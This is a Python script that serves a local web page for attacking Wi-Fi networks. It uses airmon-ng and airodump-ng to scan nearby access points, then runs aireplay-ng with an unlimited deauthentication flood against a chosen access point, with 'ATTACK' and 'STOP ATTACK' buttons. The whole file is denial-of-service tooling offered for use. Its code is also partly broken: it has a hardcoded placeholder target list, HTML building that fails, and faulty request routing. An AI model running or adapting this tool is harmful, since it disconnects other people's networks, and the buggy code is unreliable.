#!/usr/bin/env python3

from importlib.resources import path
import subprocess
import csv
import os
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):
  def do_GET(self):
    print (self.path)
    x = ["/dos?target=0", "/dos?target=1", "/dos?target=2", "/dos?target=3", "/dos?target=4", "/dos?target=5", "/dos?target=6", "/dos?target=7", "/dos?target=8", "/dos?target=9"]
    if self.path == '/':
      f = index_html
    if self.path == '/scan':
      scan()
      time.sleep(1)
      f = scan_html
    if self.path in x:
      target_id = self.path[-1:]
      print(target_id)
      input('?')
      Dos(target_id)
      time.sleep(1)
      f = dos_html
    if self.path == '/stop':
      Stop()
      f = stop_html
    else:
      self.path = '/index.html'

    self.send_response(200)
    self.send_header('Content-type','text/html')
    self.end_headers()
    self.wfile.write(bytes(f, "utf-8"))

def main():
  port = 8000
  address = '127.0.0.1'
  server_address = (address, port)
  http_server = HTTPServer((server_address), handler)
  print(f'Server running on {address} on port {port}...')
  http_server.serve_forever()

active_wireless_networks = []
hacknic = 'wlan1'

def check_for_essid(essid, lst):
  check_status = True

  if len(lst) == 0:
    return check_status

  for item in lst:
    if essid in item["ESSID"]:
      check_status = False

  return check_status

subprocess.run(["/usr/sbin/airmon-ng", "start", hacknic])

def scan():
  global to_send_as_html
  discover_access_points = subprocess.Popen(["sudo", "/usr/sbin/airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  time.sleep(5)
  subprocess.call("clear", shell=True)
  for file_name in os.listdir():
    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
    if ".csv" in file_name:
      with open(file_name) as csv_h:
        csv_h.seek(0)
        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
        for row in csv_reader:
          if row["BSSID"] == "BSSID":
            pass
          elif row["BSSID"] == "Station MAC":
            break
          elif check_for_essid(row["ESSID"], active_wireless_networks):
            active_wireless_networks.append(row)

  for index, item in enumerate(active_wireless_networks):
    to_send_list = []
    to_send_list.append(f"{index}\t{item['BSSID']}\t\t{item['ESSID']}")
    for item in to_send_list:
      to_send_as_html = []
      to_send_as_html = to_send_as_html.append('<td>'+item+'</td>\n')
      to_send_as_html = ''.join([str(item) for item in to_send_as_html])
    return to_send_as_html
  return to_send_as_html

def Dos(target_id):
  active_wireless_networks = ['AA:BB:CC:DD:EE']
  channel_wireless_networks = ['11']
  hackbssid = active_wireless_networks[int(target_id)]
  hackchannel = channel_wireless_networks[int(target_id)].strip()

  subprocess.run(["iwconfig", hacknic, "channel", hackchannel])
  subprocess.run(["/usr/sbin/aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])

def Stop():
  subprocess.run(["/usr/sbin/airmon-ng", "stop", hacknic])

style_html = '''<style>
    
* {
    margin: 0px;
    padding: 0px;
  }
  
  body {
    background-color: #eee;
  }
  
  #wrapper {
    width: 500px;
    height: 50%;
    overflow: hidden;
    border: 0px solid #000;
    margin: 50px auto;
    padding: 10px;
  }
  
  .main-content {
    width: 250px;
    height: 40%;
    margin: 10px auto;
    margin-top: 100px;
    background-color: #fff;
    border: 2px solid #e6e6e6;
    padding: 40px 50px;
  }
  
  .header {
    border: 0px solid #000;
    margin-bottom: 5px;
  }
  
  .header img {
    height: 50px;
    width: 175px;
    margin: auto;
    position: relative;
    left: 40px;
  }
  
  .input-1,
  .input-2 {
    width: 100%;
    margin-bottom: 5px;
    padding: 8px 12px;
    border: 1px solid #dbdbdb;
    box-sizing: border-box;
    border-radius: 3px;
  }

  .input-1 .playing,
  .input-2 .playing {
    border: 1px solid #dbdbdb;
    box-sizing: border-box;
  }  

  .input-3 {
    width: 100%;
    margin-bottom: 5px;
    margin-left: 175px;
    padding: 8px 12px;
    background-color: #eee;
    font-size: 14px;
    text-decoration: none;
    font-family: 'Overpass Mono', monospace;
    text-align: center;
  }
  
  .overlap-text {
    position: relative;
  }
  
  .overlap-text a {
    position: absolute;
    top: 8px;
    right: 10px;
    color: #003569;
    font-size: 14px;
    text-decoration: none;
    font-family: 'Overpass Mono', monospace;
    letter-spacing: -1px;
  }
  
  .btn {
    width: 100%;
    background-color: #3897f0;
    border: 1px solid #3897f0;
    padding: 5px 12px;
    color: #fff;
    font-weight: bold;
    cursor: pointer;
    border-radius: 3px;
  }
  
  .sub-content {
    width: 250px;
    height: 5%;
    margin: 10px auto;
    border: 1px solid #e6e6e6;
    padding: 10px 50px;
    background-color: #fff;
  }
  
  .s-part {
    text-align: center;
    font-family: 'Overpass Mono', monospace;
    word-spacing: -3px;
    letter-spacing: -2px;
    font-weight: normal;
  }
  
  .s-part a {
    text-decoration: none;
    cursor: pointer;
    color: #3897f0;
    font-family: 'Overpass Mono', monospace;
    word-spacing: -3px;
    letter-spacing: -2px;
    font-weight: normal;
  }
  
  input:focus {
      background-color: #fff;
  }

</style>
'''

index_html = '''<link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
<link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"> 
<div id="wrapper">
  <div class="main-content">
    <div class="header">
      <a class="s-part">WiFuck-web-server</a>
    </div>
    <form method="GET|POST" , enctype="multipart/form-data" action='/scan'>
      <div class="l-part"> 
          <a type="text" name=" "></a>
          <br>
          <br>
          <br>
          <br>
          <br>
          <br>
          <input type="submit" value="SCAN" class="btn"/>
      </div>    
    </form>
  </div>
  <br>
  <a class="input-3">Get the app.</a>
</div>''' + style_html

to_send_as_html = '0 : test'

scan_html = f'''<link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
<div id="wrapper">
  <div class="main-content">
    <div class="header">
      <a class="s-part">WiFuck-web-server</a>
    </div>
    <form method="GET|POST" , enctype="multipart/form-data" action='/dos'>
      <div class="l-part"> 
          <a type="text" name=" "></a>
          {to_send_as_html}
          <br>
          <br>
          <input type="text" name="target" placeholder="Target" class="input-1 playing" />
          <input type="submit" value="ATTACK" class="btn"/>
      </div>    
    </form>
  </div>
  <div class="sub-content">
    <div class="s-part">
      Don't have an account?<a href="#">Sign up</a>
    </div>
  </div>    
  <br>
  <a class="input-3">Get the app.</a>
</div>
''' + style_html

dos_html = '''<link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
<div id="wrapper">
  <div class="main-content">
    <div class="header">
      <a class="s-part">WiFuck-web-server</a>
    </div>
    <form method="GET|POST" , enctype="multipart/form-data" action='/stop'>
      <div class="l-part"> 
          <br>
          <a class="s-part"> Dosing...</a>
          <br>
          <a class="s-part"> Dosing...</a>
          <br>
          <a class="s-part"> Dosing...</a>
          <br>
          <a class="s-part"> Dosing...</a>
          <br>
          <br>
          <br>
          <input type="submit" value="STOP ATTACK" class="btn"/>
      </div>    
    </form>
  </div>  
  <br>
  <a class="input-3">Get the app.</a>
</div>''' + style_html

stop_html = '''<style>
    body {
        background-color: #faebd7;
        background-image: url("https://i.kym-cdn.com/photos/images/original/001/109/433/22b.jpg");
  }

</style>'''

if __name__ == '__main__':
    main()
